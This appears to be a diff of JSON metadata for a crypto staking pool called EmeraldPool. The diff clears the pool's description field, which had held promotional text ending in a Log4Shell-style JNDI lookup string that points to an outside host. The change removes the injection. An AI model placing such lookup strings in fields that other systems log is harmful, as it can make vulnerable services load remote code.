@@ -1,6 +1,6 @@
 {
 	"name": "EmeraldPool",
-	"description": "Emerald Pool aims to bring purpose to crypto staking. While we build out the functionality to do this, we invite you to join our pool and enjoy 0% margin. Stay ttuned! ${jndi:http://ieksec.io/will/keep/you/safe}",
+	"description": "",
 	"ticker": "EMRLD",
 	"homepage": "http://emeraldpool.io"
 }
